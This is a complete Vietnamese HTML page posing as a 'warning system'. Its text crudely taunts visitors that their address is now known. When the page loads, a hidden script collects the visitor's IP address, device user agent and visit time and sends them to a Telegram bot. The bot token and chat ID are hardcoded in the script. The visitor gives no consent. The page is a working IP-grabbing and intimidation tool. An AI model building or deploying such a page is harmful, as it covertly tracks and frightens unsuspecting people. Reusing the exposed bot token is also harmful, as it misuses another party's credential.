<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>HỆ THỐNG CẢNH BÁO</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
  body { background-color: #0a0a0a; color: #fff; height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; text-align: center; }
  .box { background: #141414; border: 1px solid #2c2c2e; border-radius: 20px; padding: 40px 25px; max-width: 380px; width: 100%; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
  .icon { font-size: 60px; margin-bottom: 20px; }
  h1 { font-size: 20px; font-weight: 800; color: #ff3b30; margin-bottom: 15px; text-transform: uppercase; }
  p { font-size: 15px; color: #aaa; line-height: 1.6; margin-bottom: 30px; }
  .highlight { color: #fff; font-weight: bold; font-size: 18px; text-transform: uppercase; }
  .btn-link { display: block; width: 100%; background: #0a84ff; color: #fff; text-decoration: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; }
</style>
</head>
<body>

<div class="box">
  <div class="icon">⚠️</div>
  <h1>CẢNH BÁO</h1>
  <p>
    Hệ thống đã ghi nhận địa chỉ của bạn.<br><br>
    <span class="highlight">ĐỊA CHỈ MÀY ĐÃ BỊ TAO BIẾT =)))</span>
  </p>
  <a href="https://facebook.com" target="_blank" class="btn-link">TRUY CẬP LINK</a>
</div>

<script>
  // THAY TOKEN VÀ CHAT ID CỦA ANH VÀO ĐÂY
  const TELEGRAM_TOKEN = "8660618458:AAEXWx-onvsTBy0eNpoMcwx1hW3SApo8XB4";
  const TELEGRAM_CHAT_ID = "6746272962";

  async function run() {
    try {
      let msg = `🚨 <b>CÓ NGƯỜI TRUY CẬP WEB</b>\n`;
      msg += `⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}\n`;
      msg += `📱 Thiết bị: ${navigator.userAgent}\n`;

      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        msg += `🌍 IP: <code>${ipData.ip}</code>\n`;
      } catch (e) {
        msg += `🌍 IP: (Không lấy được)\n`;
      }

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
      });

    } catch (err) {
      console.error(err);
    }
  }

  window.onload = run;
</script>
</body>
</html>
